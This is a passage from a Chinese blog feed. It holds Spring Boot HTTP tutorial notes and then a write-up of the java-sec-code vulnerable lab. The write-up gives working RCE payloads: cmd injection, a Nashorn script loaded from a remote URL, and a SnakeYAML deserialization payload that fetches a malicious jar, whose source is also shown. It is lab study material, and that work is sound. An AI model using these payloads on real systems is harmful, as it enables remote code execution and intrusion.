src="https://heuqqdmbyk.feishu.cn/space/api/box/stream/download/asynccode/?code=OWNlZWQ0MTg0NTY5ZjhhY2RkYmQ5MDUzMWJlN2UwNDJfUGVFSVI0U2ZXMDE0SlRsVmdiZmtuYVk2Nk5wMkM3WGhfVG9rZW46R0N1U2J1dVhZb3A4TWR4aVBIOGM1aDBZbjNnXzE3NTQyNzczMDE6MTc1NDI4MDkwMV9WNA" alt="img" loading="lazy"></p><p>而像HTML、CSS、JS 以及图片、音频、视频等这些资源，我们都称为<strong>静态资源</strong>。 所谓静态资源，就是指在服务器上存储的不会改变的数据，通常不会根据用户的请求而变化。</p><p>那与静态资源对应的还有一类资源，就是动态资源。那所谓<strong>动态资源</strong>，就是指在服务器端上存储的，会根据用户请求和其他数据动态生成的，内容可能会在每次请求时都发生变化。比如：Servlet、JSP等(负责逻辑处理)。而Servlet、JSP这些技术现在早都被企业淘汰了，现在在企业项目开发中，都是直接基于Spring框架来构建动态资源。</p><p><strong>BS架构</strong>。</p><ul><li><p>BS架构：Browser&#x2F;Server，浏览器&#x2F;服务器架构模式。客户端只需要浏览器，应用程序的逻辑和数据都存储在服务端。</p><p>优点：维护方便</p><p>缺点：体验一般</p></li><li><p>CS架构：Client&#x2F;Server，客户端&#x2F;服务器架构模式。需要单独开发维护客户端。</p><p>优点：体验不错</p><p>缺点：开发维护麻烦</p></li></ul><h4 id="SpringBoot-Web"><a href="#SpringBoot-Web" class="headerlink" title="SpringBoot Web"></a>SpringBoot Web</h4><p><strong>Spring Boot 可以帮助我们非常快速的构建应用程序、简化开发、提高效率 。</strong></p><p><strong>而直接基于SpringBoot进行项目构建和开发，不仅是Spring官方推荐的方式，也是现在企业开发的主流。</strong></p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508051019338.png" alt="image-20250805101916166" loading="lazy"></p><h4 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h4><p>http协议规定了浏览器和服务器之间数据传输的规则</p><p>特点：</p><p>1.基于TCP协议：面向连接，安全</p><p>2.基于请求-响应模型的：因此请求对应因此响应</p><p>3.http协议是无状态的协议：对于事务处理没有记忆能力。每次请求-响应都是独立的</p><ul><li>缺点：多次请求间不能各项数据</li><li>优点：速度快</li></ul><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508051038045.png" alt="image-20250805103806999" loading="lazy"></p><h5 id="请求协议"><a href="#请求协议" class="headerlink" title="请求协议"></a>请求协议</h5><p>请求数据</p><p>由请求行：请求数据第一行（请求方式、资源路径、协议）</p><p>请求头：第二行开始，格式key:value</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508051037914.png" alt="image-20250805103740867" loading="lazy"></p><p>请求体：POST请求，存放请求参数（GET部分没有）</p><p>Web服务器(Tomcat)对HTTP协议的请求数据进行解析，并进行了封装(HttpServletRequest)，在调用Controller方法的时候传递给了该方法。这样，就使得程序员不必直接对协议进行操作，让Web开发更加便捷。</p><h5 id="请求数据获取"><a href="#请求数据获取" class="headerlink" title="请求数据获取"></a>请求数据获取</h5><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508071046180.png" alt="image-20250807104555029" loading="lazy"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.kinsey.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span> <span class="comment">//标记这个类用来处理浏览器发送过来的网络请求</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/request&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">request</span><span class="params">(HttpServletRequest request)</span>&#123;</span><br><span class="line">        <span class="comment">//1.获取请求方式</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> request.getMethod();</span><br><span class="line">        <span class="comment">//2.获取请求的url地址</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> request.getRequestURL().toString();</span><br><span class="line">        System.out.println(<span class="string">&quot;请求url地址: &quot;</span>+url);</span><br><span class="line"></span><br><span class="line">        String uri=request.getRequestURI();</span><br><span class="line">        System.out.println(<span class="string">&quot;请求uri地址: &quot;</span>+uri);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.获取请求协议</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> request.getProtocol();</span><br><span class="line">        System.out.println(<span class="string">&quot;请求协议: &quot;</span>+protocol);</span><br><span class="line">        <span class="comment">//4.获取请求参数 -name</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;请求参数-name: &quot;</span>+name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//5.获取请求头 -Accept</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">header</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;Accept&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;请求头-Accept: &quot;</span>+header);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="响应协议"><a href="#响应协议" class="headerlink" title="响应协议"></a>响应协议</h5><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508071136946.png" alt="image-20250807113637867" loading="lazy"></p><h5 id="响应数据设置"><a href="#响应数据设置" class="headerlink" title="响应数据设置"></a>响应数据设置</h5><p>Web服务器对HTTP协议的响应数据进行了封装(HttpServletResponse)，并在调用Controller方法的时候传递给<br>了该方法。这样，就使得程序员不必直接对协议进行操作，让Web开发更加便捷。</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508071146869.png" alt="image-20250807114612816" loading="lazy"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.kinsey.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ResponseController</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 响应 方式一：HttpServletResponse设置响应数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> response</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/response&quot;)</span></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">void</span> <span class="title function_">response</span><span class="params">(HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//1.设置响应状态码</span></span><br><span class="line">        response.setStatus(<span class="number">401</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.设置响应头</span></span><br><span class="line">        response.setHeader(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;kinsey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.设置响应体</span></span><br><span class="line">        response.getWriter().write(<span class="string">&quot;&lt;h1&gt;hello response&lt;/h1&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 响应方式二：ResponseEntity Spring提供的方法</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;response2&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;String&gt; <span class="title function_">response2</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ResponseEntity</span><br><span class="line">                .status(<span class="number">401</span>)</span><br><span class="line">                .header(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;kinsey&quot;</span>)</span><br><span class="line">                .body(<span class="string">&quot;&lt;h1&gt;hello response2&lt;/h1&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Js&quot;&gt;&lt;a href=&quot;#Js&quot; class=&quot;headerlink&quot; title=&quot;Js&quot;&gt;&lt;/a&gt;Js&lt;/h3&gt;&lt;p&gt;Js用来负责网页行为&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://insey.oss-cn-shenzhen.aliyuncs.com</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>java-sec-code</title>
    <link href="https://kinseyy.github.io/2025/06/26/java-sec-code/"/>
    <id>https://kinseyy.github.io/2025/06/26/java-sec-code/</id>
    <published>2025-06-26T12:58:52.000Z</published>
    <updated>2025-07-30T03:36:12.321Z</updated>
    
    <content type="html"><![CDATA[<p>靶场需访问<a href="http://localhost:8080/index">http://localhost:8080/index</a></p><p>默认账号密码为admin admin123</p><p>题目在源码里（亏我找半天）</p><p>由于后面环境是docker开的，计算器可能弹不出来</p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><h4 id="1-rce-runtime-exec"><a href="#1-rce-runtime-exec" class="headerlink" title="1. &#x2F;rce&#x2F;runtime&#x2F;exec"></a>1. &#x2F;rce&#x2F;runtime&#x2F;exec</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/runtime/exec&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">CommandExec</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">run</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> run.exec(cmd);</span><br><span class="line">            <span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(p.getInputStream());</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">            String tmpStr;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((tmpStr = inBr.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                sb.append(tmpStr);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (p.waitFor() != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (p.exitValue() == <span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Command exec failed!!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            inBr.close();</span><br><span class="line">            in.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>命令执行</strong>：通过调用 <code>Runtime.getRuntime().exec(cmd)</code> 执行传入的命令，这会启动一个新的子进程来执行该命令。</p><p><strong>输入流处理</strong>：使用 <code>BufferedInputStream</code> 和 <code>BufferedReader</code> 从子进程的标准输出流中读取命令执行的结果。这些结果会被累积到一个 <code>StringBuilder</code> 中。</p><p><strong>异常捕获</strong>：如果执行过程中发生异常，捕获并返回异常的字符串描述。</p><p><strong>退出码处理</strong>：在命令执行完成后，检查子进程的退出码。如果退出码不为零且为 1，则表示命令执行失败。</p><p><strong>返回结果</strong>：如果命令执行成功，返回命令的输出内容；如果发生错误，则返回错误信息。</p><p>我们可以通过Runtime.getRuntime()这个方法来进行命令执行，在该代码里它通过传入cmd变量进行命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=whoami</span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412062003249.png" alt="image-20241206200351163" loading="lazy"></p><h4 id="2-rce-ProcessBuilder"><a href="#2-rce-ProcessBuilder" class="headerlink" title="2.&#x2F;rce&#x2F;ProcessBuilder"></a>2.&#x2F;rce&#x2F;ProcessBuilder</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/ProcessBuilder&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">processBuilder</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">       <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           String[] arrCmd = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">           <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(arrCmd);</span><br><span class="line">           <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">           <span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(p.getInputStream());</span><br><span class="line">           <span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">           String tmpStr;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">while</span> ((tmpStr = inBr.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">               sb.append(tmpStr);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           <span class="keyword">return</span> e.toString();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> sb.toString();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>命令执行</strong>： <code>String[] arrCmd = &#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;;</code><br>通过 <code>ProcessBuilder</code> 启动一个新的 shell 进程，执行传入的命令 <code>cmd</code>。这里使用 <code>-c</code> 选项告诉 shell 执行字符串中的命令。</p><p><strong>启动进程</strong>： <code>Process p = processBuilder.start();</code><br>启动进程后，获取该进程的标准输出流并读取其内容。</p><p><strong>读取输出</strong>： 通过 <code>BufferedInputStream</code> 和 <code>BufferedReader</code> 逐行读取进程的输出并存储在 <code>StringBuilder</code> 中。</p><p><strong>异常处理</strong>： 如果命令执行失败或抛出异常，会返回异常的字符串表示。</p><p>该代码通过get请求传入一个cmd，然后利用ProcessBuilder这个类调用系统进程来命令执行</p><p>注意，在windows系统里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String[] arrCmd = &#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125;;</span><br></pre></td></tr></table></figure><p>我们需要在源代码中修改，不然命令执行会报错</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412062024910.png" alt="image-20241206202436880" loading="lazy"></p><h4 id="3-rce-jscmd"><a href="#3-rce-jscmd" class="headerlink" title="3.&#x2F;rce&#x2F;jscmd"></a>3.&#x2F;rce&#x2F;jscmd</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/jscmd&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">jsEngine</span><span class="params">(String jsurl)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="comment">// js nashorn javascript ecmascript</span></span><br><span class="line">    <span class="type">ScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>().getEngineByName(<span class="string">&quot;js&quot;</span>);</span><br><span class="line">    <span class="type">Bindings</span> <span class="variable">bindings</span> <span class="operator">=</span> engine.getBindings(ScriptContext.ENGINE_SCOPE);</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> String.format(<span class="string">&quot;load(\&quot;%s\&quot;)&quot;</span>, jsurl);</span><br><span class="line">    engine.eval(cmd, bindings);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到它接收一个名为 <code>jsurl</code> 的参数；</p><p>然后使用 Nashorn JavaScript 引擎执行传入 URL 所加载的 JavaScript 脚本。</p><p>由于命令无回显，我们可以通过报错来判断</p><p>shell.js</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var a = mainOutput(); function mainOutput() &#123; var x=java.lang.Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/rce/jscmd?jsurl=http://ip/shell.js</span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505222139928.png" alt="image-20250522213856792" loading="lazy"></p><p>说不存在clac.exe，的确不存在，这说明命令成功执行</p><h4 id="4-rce-vuln-yarm"><a href="#4-rce-vuln-yarm" class="headerlink" title="4.&#x2F;rce&#x2F;vuln&#x2F;yarm"></a>4.&#x2F;rce&#x2F;vuln&#x2F;yarm</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/vuln/yarm&quot;)</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">yarm</span><span class="params">(String content)</span> &#123;</span><br><span class="line">     <span class="type">Yaml</span> <span class="variable">y</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">     y.load(content);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><code>SnakeYaml</code>是用来解析yaml的格式，可以用于Java对象的序列化、反序列化。该代码利用SnakeYAML存在的反序列化漏洞来rce，在解析恶意 yml 内容时会完成指定的动作，实现命令执行。我们所加载的yaml文件如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!javax.script.ScriptEngineManager</span> [</span><br><span class="line">  <span class="type">!!java.net.URLClassLoader</span> [[</span><br><span class="line">    <span class="type">!!java.net.URL</span> [<span class="string">&quot;http://127.0.0.1/yaml-payload.jar&quot;</span>]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>jar是我们远程加载的恶意文件，源码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> artsploit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AwesomeScriptEngineFactory</span> <span class="keyword">implements</span> <span class="title class_">ScriptEngineFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AwesomeScriptEngineFactory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEngineName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEngineVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getExtensions</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getMimeTypes</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getNames</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLanguageName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLanguageVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getParameter</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMethodCallSyntax</span><span class="params">(String obj, String m, String... args)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getOutputStatement</span><span class="params">(String toDisplay)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getProgram</span><span class="params">(String... statements)</span> &#123;</span><br><span class="line">        <span 